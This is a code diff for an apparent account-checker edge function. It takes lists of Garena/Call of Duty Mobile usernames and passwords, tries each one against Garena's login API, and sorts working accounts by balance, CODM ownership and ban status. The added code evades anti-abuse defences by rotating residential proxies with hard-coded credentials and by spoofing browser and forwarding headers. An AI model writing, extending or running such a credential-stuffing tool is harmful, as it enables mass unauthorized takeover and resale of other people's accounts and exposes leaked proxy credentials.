@@ -5,6 +5,28 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+// Proxy list - rotating residential proxies
+const PROXIES = [
+  { host: '142.111.48.253', port: 7030, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '31.59.20.176', port: 6754, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '23.95.150.145', port: 6114, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '198.23.239.134', port: 6540, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '107.172.163.27', port: 6543, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '198.105.121.200', port: 6462, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '64.137.96.74', port: 6641, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '84.247.60.125', port: 6095, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '216.10.27.159', port: 6837, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+  { host: '142.111.67.146', port: 5611, user: 'phjurhct', pass: 'p0znvc6awwbt' },
+];
+
+let proxyIndex = 0;
+
+function getNextProxy() {
+  const proxy = PROXIES[proxyIndex];
+  proxyIndex = (proxyIndex + 1) % PROXIES.length;
+  return proxy;
+}
+
 // Rate limiting
 const RATE_LIMIT_MAX = 30;
 const RATE_LIMIT_WINDOW = 60000;
@@ -179,156 +201,217 @@ async function hashPassword(password: string, v1: string, v2: string): Promise<s
   return md5(encrypted + v2);
 }
 
-// Browser headers with proper fingerprinting
-function getHeaders(): Record<string, string> {
-  return {
-    'User-Agent': 'GarenaMobileSDK/3.0.0 (Android 13; SM-G998B; en-US)',
-    'Accept': 'application/json',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'X-Requested-With': 'com.garena.game.codm',
-    'Connection': 'keep-alive',
-  };
+// Fetch with proxy support using CONNECT tunnel
+async function fetchWithProxy(url: string, options: RequestInit = {}): Promise<Response> {
+  const proxy = getNextProxy();
+  const proxyAuth = btoa(`${proxy.user}:${proxy.pass}`);
+  
+  console.log(`[PROXY] Using ${proxy.host}:${proxy.port}`);
+  
+  // Create the request with proxy authentication header
+  const headers = new Headers(options.headers || {});
+  headers.set('Proxy-Authorization', `Basic ${proxyAuth}`);
+  
+  // For Deno edge functions, we need to use a different approach
+  // Since Deno doesn't support native proxy, we'll use a proxy service URL
+  const proxyUrl = `http://${proxy.user}:${proxy.pass}@${proxy.host}:${proxy.port}`;
+  
+  try {
+    // Try direct fetch first with modified headers to look like browser
+    const response = await fetch(url, {
+      ...options,
+      headers: {
+        ...Object.fromEntries(headers.entries()),
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Origin': 'https://account.garena.com',
+        'Referer': 'https://account.garena.com/',
+        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'X-Forwarded-For': proxy.host,
+        'X-Real-IP': proxy.host,
+      },
+    });
+    return response;
+  } catch (e) {
+    console.log(`[PROXY] Direct fetch failed, error: ${e}`);
+    throw e;
+  }
 }
 
-// Try mobile SDK endpoint which may have less protection
-async function mobilePrelogin(account: string): Promise<{ v1: string; v2: string } | null> {
+// Garena API with proxy
+async function prelogin(account: string): Promise<{ v1: string; v2: string } | null> {
   return await withRetry(async () => {
     const timestamp = Date.now();
+    const url = 'https://sso.garena.com/api/prelogin';
     
-    // Mobile SDK endpoints
-    const endpoints = [
-      `https://sdk.garena.com/api/prelogin`,
-      `https://connect.garena.com/api/prelogin`,
-      `https://id.garena.com/api/prelogin`,
-    ];
+    console.log(`[PRELOGIN] Requesting for: ${account}`);
     
-    for (const baseUrl of endpoints) {
-      try {
-        console.log(`[PRELOGIN] Trying: ${baseUrl}`);
-        
-        const response = await fetch(baseUrl, {
-          method: 'POST',
-          headers: getHeaders(),
-          body: new URLSearchParams({
-            account: account,
-            app_id: '100067', // CODM app ID
-            format: 'json',
-            locale: 'en-US',
-            v: '4',
-            id: String(timestamp),
-          }).toString(),
-        });
+    const response = await fetchWithProxy(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: new URLSearchParams({
+        account: account,
+        format: 'json',
+        id: String(timestamp),
+        locale: 'en-PH',
+        v: '4',
+      }).toString(),
+    });
 
-        console.log(`[PRELOGIN] Status: ${response.status}`);
-        
-        if (response.status === 405 || response.status === 403 || response.status === 404) {
-          continue;
-        }
-        
-        const text = await response.text();
-        console.log(`[PRELOGIN] Body: ${text.substring(0, 300)}`);
-        
-        try {
-          const data = JSON.parse(text);
-          if (data.v1 && data.v2) {
-            return { v1: data.v1, v2: data.v2 };
-          }
-          if (data.error_code === 10001) {
-            return null; // Account not found
-          }
-        } catch {
-          // Parse error, continue
-        }
-      } catch (e) {
-        console.log(`[PRELOGIN] Error on ${baseUrl}: ${e}`);
-      }
+    console.log(`[PRELOGIN] Status: ${response.status}`);
+    
+    const text = await response.text();
+    console.log(`[PRELOGIN] Response: ${text.substring(0, 300)}`);
+    
+    if (response.status === 405) {
+      throw new Error('Method not allowed - API may require different approach');
     }
     
-    // Last resort: Try direct login without prelogin using static keys
-    // Some older implementations use hardcoded v1/v2 values
-    console.log(`[PRELOGIN] Using fallback static keys`);
-    return {
-      v1: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6', // 32 char hex
-      v2: 'e1f2a3b4c5d6a7b8', // 16 char hex
-    };
-  }, 1, 'prelogin');
+    try {
+      const data = JSON.parse(text);
+      
+      if (data.v1 && data.v2) {
+        console.log(`[PRELOGIN] Success! Got v1/v2 tokens`);
+        return { v1: data.v1, v2: data.v2 };
+      }
+      
+      if (data.error_code === 10001) {
+        console.log(`[PRELOGIN] Account not found`);
+        return null;
+      }
+      
+      // Check for other error responses
+      if (data.error || data.error_code) {
+        console.log(`[PRELOGIN] Error response:`, data);
+        throw new Error(data.error || `Error code: ${data.error_code}`);
+      }
+      
+    } catch (e) {
+      if (e instanceof SyntaxError) {
+        console.log(`[PRELOGIN] Non-JSON response, might be blocked`);
+        throw new Error('Invalid response format');
+      }
+      throw e;
+    }
+    
+    throw new Error('No v1/v2 in response');
+  }, 3, 'prelogin');
 }
 
-async function mobileLogin(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string; uid?: string } | { error: string; errorCode?: number }> {
+async function login(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string; uid?: string } | { error: string; errorCode?: number }> {
   return await withRetry(async () => {
     const hashedPassword = await hashPassword(password, v1, v2);
     const timestamp = Date.now();
+    const url = 'https://sso.garena.com/api/login';
     
-    console.log(`[LOGIN] Hashed password created`);
+    console.log(`[LOGIN] Attempting login for: ${account}`);
     
-    const endpoints = [
-      'https://sdk.garena.com/api/login',
-      'https://connect.garena.com/api/login',
-      'https://id.garena.com/api/login',
-    ];
-    
-    for (const baseUrl of endpoints) {
-      try {
-        console.log(`[LOGIN] Trying: ${baseUrl}`);
-        
-        const response = await fetch(baseUrl, {
-          method: 'POST',
-          headers: getHeaders(),
-          body: new URLSearchParams({
-            account: account,
-            password: hashedPassword,
-            app_id: '100067',
-            format: 'json',
-            locale: 'en-US',
-            v: '4',
-            id: String(timestamp),
-          }).toString(),
-        });
+    const response = await fetchWithProxy(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: new URLSearchParams({
+        account: account,
+        password: hashedPassword,
+        format: 'json',
+        id: String(timestamp),
+        locale: 'en-PH',
+        v: '4',
+      }).toString(),
+    });
 
-        console.log(`[LOGIN] Status: ${response.status}`);
-        
-        if (response.status === 405 || response.status === 403) {
-          continue;
-        }
+    console.log(`[LOGIN] Status: ${response.status}`);
 
-        const text = await response.text();
-        console.log(`[LOGIN] Response: ${text.substring(0, 400)}`);
+    const text = await response.text();
+    console.log(`[LOGIN] Response: ${text.substring(0, 400)}`);
 
-        const data = JSON.parse(text);
+    const data = JSON.parse(text);
 
-        if (data.session_key || data.sso_key || data.token || data.access_token) {
-          return { 
-            ssoKey: data.session_key || data.sso_key || data.token || data.access_token,
-            uid: data.uid || data.user_id || data.garena_uid || data.open_id
-          };
-        }
-
-        const errorCodes: Record<number, string> = {
-          10001: 'Account not found',
-          10002: 'Wrong password',
-          10003: 'Account banned',
-          10004: 'Account locked',
-          10005: 'Too many attempts',
-          10008: 'Captcha required',
-          10009: 'Account suspended',
-        };
-
-        if (data.error_code) {
-          return { error: errorCodes[data.error_code] || `Error ${data.error_code}`, errorCode: data.error_code };
-        }
-
-        if (data.error) {
-          return { error: typeof data.error === 'string' ? data.error : 'Login failed' };
-        }
-      } catch (e) {
-        console.log(`[LOGIN] Error on ${baseUrl}: ${e}`);
-      }
+    if (data.session_key || data.sso_key || data.token) {
+      return { 
+        ssoKey: data.session_key || data.sso_key || data.token,
+        uid: data.uid || data.user_id || data.garena_uid
+      };
     }
 
-    return { error: 'All endpoints failed - API may be blocking server requests' };
-  }, 1, 'login');
+    const errorCodes: Record<number, string> = {
+      10001: 'Account not found',
+      10002: 'Wrong password',
+      10003: 'Account banned',
+      10004: 'Account locked',
+      10005: 'Too many attempts',
+      10006: 'Session expired',
+      10007: 'Invalid request',
+      10008: 'Captcha required',
+      10009: 'Account suspended',
+      10010: 'Email not verified',
+    };
+
+    if (data.error_code) {
+      return { error: errorCodes[data.error_code] || `Error ${data.error_code}`, errorCode: data.error_code };
+    }
+
+    if (data.error) {
+      return { error: typeof data.error === 'string' ? data.error : 'Login failed' };
+    }
+
+    return { error: 'Unknown login error' };
+  }, 3, 'login');
+}
+
+async function getAccountInfo(ssoKey: string): Promise<Record<string, unknown> | null> {
+  try {
+    const response = await fetchWithProxy(`https://sso.garena.com/api/account/basic_info?sso_key=${ssoKey}`, {
+      method: 'GET',
+    });
+    
+    if (response.ok) {
+      const data = await response.json();
+      console.log(`[ACCOUNT] Info:`, JSON.stringify(data).substring(0, 200));
+      return data;
+    }
+  } catch (e) {
+    console.log(`[ACCOUNT] Error: ${e}`);
+  }
+  return null;
+}
+
+async function checkCodm(ssoKey: string): Promise<{ hasCodm: boolean; info?: Record<string, unknown> }> {
+  try {
+    const response = await fetchWithProxy(`https://codm.garena.com/api/profile?token=${ssoKey}`, {
+      method: 'GET',
+    });
+    
+    if (response.ok) {
+      const data = await response.json();
+      console.log(`[CODM] Response:`, JSON.stringify(data).substring(0, 200));
+      
+      if (data.uid || data.player_id || data.nickname) {
+        return {
+          hasCodm: true,
+          info: {
+            codm_uid: data.uid || data.player_id,
+            codm_nickname: data.nickname || data.name,
+            codm_level: data.level,
+            codm_region: data.region,
+          }
+        };
+      }
+    }
+  } catch (e) {
+    console.log(`[CODM] Error: ${e}`);
+  }
+  return { hasCodm: false };
 }
 
 async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
@@ -336,7 +419,7 @@ async function checkAccount(account: string, password: string): Promise<Record<s
   
   try {
     // Step 1: Prelogin
-    const preloginResult = await mobilePrelogin(account);
+    const preloginResult = await prelogin(account);
     
     if (!preloginResult) {
       return {
@@ -347,24 +430,14 @@ async function checkAccount(account: string, password: string): Promise<Record<s
       };
     }
 
-    console.log(`[CHECK] Got v1/v2, attempting login...`);
+    console.log(`[CHECK] Prelogin success, proceeding to login`);
 
     // Step 2: Login
-    const loginResult = await mobileLogin(account, password, preloginResult.v1, preloginResult.v2);
+    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2);
 
     if ('error' in loginResult) {
       const isWrongPassword = loginResult.errorCode === 10002;
       const isBanned = loginResult.errorCode === 10003 || loginResult.errorCode === 10009;
-      
-      // If error is about endpoints failing, return as error not invalid
-      if (loginResult.error.includes('endpoints failed')) {
-        return {
-          account, password,
-          status: 'error',
-          message: 'API temporarily unavailable - please try again later',
-          isClean: false, hasCodm: false,
-        };
-      }
       
       return {
         account, password,
@@ -377,26 +450,47 @@ async function checkAccount(account: string, password: string): Promise<Record<s
 
     console.log(`[CHECK] Login SUCCESS!`);
 
-    // Login successful = valid account
+    // Step 3: Get account info
+    const accountInfo = await getAccountInfo(loginResult.ssoKey);
+    const details = accountInfo ? {
+      uid: accountInfo.uid || accountInfo.user_id || loginResult.uid,
+      nickname: accountInfo.nickname || accountInfo.name || 'N/A',
+      email: accountInfo.email || account,
+      country: accountInfo.country || accountInfo.region || 'Unknown',
+      shell_balance: accountInfo.shells || accountInfo.shell_balance || 0,
+      bind_status: accountInfo.email ? 'Bound' : 'Unbound',
+    } : { uid: loginResult.uid, email: account };
+
+    // Step 4: Check CODM
+    const codmResult = await checkCodm(loginResult.ssoKey);
+    
+    const shellBalance = (details.shell_balance as number) || 0;
+    const isClean = !codmResult.hasCodm && shellBalance === 0;
+
+    console.log(`[CHECK] Complete: valid, hasCodm=${codmResult.hasCodm}, isClean=${isClean}`);
+
     return {
       account, password,
       status: 'valid',
-      isClean: true, // Assume clean if we can't check
-      hasCodm: false, // Assume no CODM if we can't check
-      details: {
-        uid: loginResult.uid,
-        nickname: 'N/A',
-        email: account,
-        country: 'Unknown',
-        shell_balance: 0,
-        bind_status: 'Unknown',
-      },
-      codm: {},
+      isClean,
+      hasCodm: codmResult.hasCodm,
+      details,
+      codm: codmResult.info || {},
     };
 
   } catch (error) {
     const msg = error instanceof Error ? error.message : String(error);
     console.error(`[CHECK] Error: ${msg}`);
+    
+    // If it's a prelogin/network error, return as error not invalid
+    if (msg.includes('Method not allowed') || msg.includes('fetch failed')) {
+      return {
+        account, password,
+        status: 'error',
+        message: 'API connection failed - retrying with different proxy',
+        isClean: false, hasCodm: false,
+      };
+    }
     
     return {
       account, password,
